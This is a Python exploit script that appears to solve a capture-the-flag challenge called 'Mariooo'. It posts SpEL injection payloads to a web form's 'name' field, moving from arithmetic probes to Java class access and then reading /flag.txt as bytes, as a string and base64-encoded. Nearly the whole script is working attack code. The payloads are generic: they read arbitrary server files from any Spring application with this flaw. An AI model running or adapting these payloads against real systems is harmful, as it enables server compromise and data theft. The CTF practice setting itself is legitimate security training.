#!/usr/bin/env python3
"""
Mariooo Challenge - Manual Step-by-Step Exploit
SpEL Injection to read /flag.txt

This script walks through each exploitation step manually.
"""

import requests
import sys
import base64

def print_step(step_num, description):
    """Print a formatted step header"""
    print("\n" + "=" * 70)
    print(f"STEP {step_num}: {description}")
    print("=" * 70)

def main():
    if len(sys.argv) != 2:
        print("Usage: python exploit_manual.py <target_url>")
        print("\nExample:")
        print("  python exploit_manual.py http://c1.arena.airoverflow.com:12345/")
        sys.exit(1)
    
    target_url = sys.argv[1]
    if not target_url.endswith('/'):
        target_url += '/'
    
    print("=" * 70)
    print("Mariooo Challenge - Manual Exploitation Walkthrough")
    print("=" * 70)
    print(f"\nTarget URL: {target_url}\n")
    
    # Step 1: Test basic math
    print_step(1, "Testing Basic Expression Evaluation")
    payload1 = "${{7*7}}"
    print(f"Payload: {payload1}")
    print("Expected: Should return 49")
    
    try:
        resp1 = requests.post(target_url, data={"name": payload1}, timeout=10)
        print(f"\nResponse preview: {resp1.text[:200]}")
        
        if "49" in resp1.text:
            print("âœ“ SUCCESS: Expression evaluation confirmed!")
        else:
            print("âœ— FAILED: Did not find expected result")
    except Exception as e:
        print(f"âœ— ERROR: {e}")
    
    input("\nPress Enter to continue to Step 2...")
    
    # Step 2: Test Java class access
    print_step(2, "Testing Java Class Access")
    payload2 = "${T(java.lang.Math).sqrt(81)}"
    print(f"Payload: {payload2}")
    print("Expected: Should return 9")
    
    try:
        resp2 = requests.post(target_url, data={"name": payload2}, timeout=10)
        print(f"\nResponse preview: {resp2.text[:200]}")
        
        if "9" in resp2.text or "9.0" in resp2.text:
            print("âœ“ SUCCESS: Java class access confirmed!")
            print("  This is SpEL (Spring Expression Language) injection")
        else:
            print("âœ— FAILED: Did not find expected result")
    except Exception as e:
        print(f"âœ— ERROR: {e}")
    
    input("\nPress Enter to continue to Step 3...")
    
    # Step 3: Read file as byte array
    print_step(3, "Reading /flag.txt as Byte Array")
    payload3 = "${T(java.util.Arrays).toString(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}"
    print(f"Payload: {payload3}")
    print("Expected: Should return byte array like [80, 67, 67, ...]")
    
    try:
        resp3 = requests.post(target_url, data={"name": payload3}, timeout=10)
        print(f"\nResponse preview: {resp3.text[:300]}")
        
        if "[" in resp3.text and "]" in resp3.text:
            print("âœ“ SUCCESS: Got byte array response")
            print("  Note: This is the flag in byte format, need to convert to string")
        else:
            print("âœ— FAILED: Did not get byte array")
    except Exception as e:
        print(f"âœ— ERROR: {e}")
    
    input("\nPress Enter to continue to Step 4...")
    
    # Step 4: Read file as string (THE WINNER)
    print_step(4, "Reading /flag.txt as String (Direct)")
    payload4 = "${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}"
    print(f"Payload: {payload4}")
    print("Expected: Should return the flag as readable text")
    
    try:
        resp4 = requests.post(target_url, data={"name": payload4}, timeout=10)
        print(f"\nResponse:\n{resp4.text}")
        
        import re
        flag_match = re.search(r'PCC\{[^}]+\}', resp4.text)
        if flag_match:
            print("\n" + "=" * 70)
            print("ðŸš© FLAG FOUND!")
            print("=" * 70)
            print(f"Flag: {flag_match.group(0)}")
            print("=" * 70)
            
            # Save to file
            with open("flag.txt", "w") as f:
                f.write(flag_match.group(0))
            print("\n[+] Flag saved to flag.txt")
        else:
            print("âœ— FAILED: Flag not found in response")
    except Exception as e:
        print(f"âœ— ERROR: {e}")
    
    input("\nPress Enter to continue to Step 5 (Alternative Method)...")
    
    # Step 5: Base64 method (alternative)
    print_step(5, "Reading /flag.txt with Base64 Encoding (Alternative)")
    payload5 = "${T(java.util.Base64).getEncoder().encodeToString(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}"
    print(f"Payload: {payload5}")
    print("Expected: Should return Base64-encoded flag")
    
    try:
        resp5 = requests.post(target_url, data={"name": payload5}, timeout=10)
        print(f"\nResponse preview: {resp5.text[:200]}")
        
        # Try to find and decode base64
        import re
        b64_match = re.search(r'[A-Za-z0-9+/]{20,}={0,2}', resp5.text)
        if b64_match:
            b64_string = b64_match.group(0)
            print(f"\nFound Base64: {b64_string}")
            
            try:
                decoded = base64.b64decode(b64_string).decode('utf-8')
                print(f"\nDecoded flag: {decoded}")
                print("âœ“ SUCCESS: Alternative Base64 method works!")
            except Exception as e:
                print(f"âœ— Error decoding: {e}")
        else:
            print("âœ— No Base64 string found")
    except Exception as e:
        print(f"âœ— ERROR: {e}")
    
    print("\n" + "=" * 70)
    print("EXPLOITATION COMPLETE")
    print("=" * 70)
    print("\nKey Takeaways:")
    print("1. SpEL injection allows arbitrary Java code execution")
    print("2. Can read files using java.nio.file.Files.readAllBytes()")
    print("3. Convert byte array to String for readable output")
    print("4. Base64 encoding is useful if output has encoding issues")
    print("=" * 70)

if __name__ == "__main__":
    main()
